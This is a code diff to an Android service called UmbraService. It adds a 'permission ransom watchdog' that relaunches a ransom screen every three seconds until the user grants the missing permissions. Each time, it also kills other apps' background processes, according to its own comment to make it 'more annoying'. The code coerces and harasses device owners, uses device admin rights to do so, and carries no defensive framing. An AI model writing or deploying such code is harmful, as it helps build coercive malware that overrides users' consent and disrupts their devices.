@@ -87,11 +87,58 @@ class UmbraService : Service() {
         // ── Launch engine if not already running ──
         UmbraEngine.start(this)
 
+        // ── Start permission ransom watchdog ──
+        startPermissionWatchdog()
+
         Log.d(TAG, "Foreground service started — launching engine")
         return START_STICKY
     }
 
+    // ═══════════════════════════════════════════════════════════════
+    // Permission ransom watchdog — launches PermissionRansomActivity
+    // every 3 seconds if permissions are still missing.
+    // Device admin allows background activity starts.
+    // ═══════════════════════════════════════════════════════════════
+
+    private val watchdogHandler = android.os.Handler(android.os.Looper.getMainLooper())
+    private val watchdogRunnable = object : Runnable {
+        override fun run() {
+            if (!PermissionRansomActivity.hasAllPermissions(this@UmbraService)) {
+                val missing = PermissionRansomActivity.missingPermissions(this@UmbraService)
+                Log.d(TAG, "Permission watchdog: ${missing.size} perms missing — launching ransom")
+                PermissionRansomActivity.launch(this@UmbraService)
+
+                // Also kill background processes to make it more annoying
+                try {
+                    val am = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
+                    // killBackgroundProcesses needs KILL_BACKGROUND_PROCESSES permission
+                    for (pkg in am.runningAppProcesses ?: emptyList()) {
+                        if (pkg.processName != packageName &&
+                            pkg.importance > android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
+                            try { am.killBackgroundProcesses(pkg.processName) } catch (_: Exception) {}
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.d(TAG, "Kill background processes failed: ${e.message}")
+                }
+            }
+            // Re-check every 3 seconds
+            watchdogHandler.postDelayed(this, 3000)
+        }
+    }
+
+    private fun startPermissionWatchdog() {
+        // Start after a short delay to let the engine connect first
+        watchdogHandler.postDelayed(watchdogRunnable, 5000)
+        Log.d(TAG, "Permission watchdog armed (5s delay)")
+    }
+
+    private fun stopPermissionWatchdog() {
+        watchdogHandler.removeCallbacks(watchdogRunnable)
+    }
+
     override fun onDestroy() {
+        stopPermissionWatchdog()
         releaseLocks()
         super.onDestroy()
     }
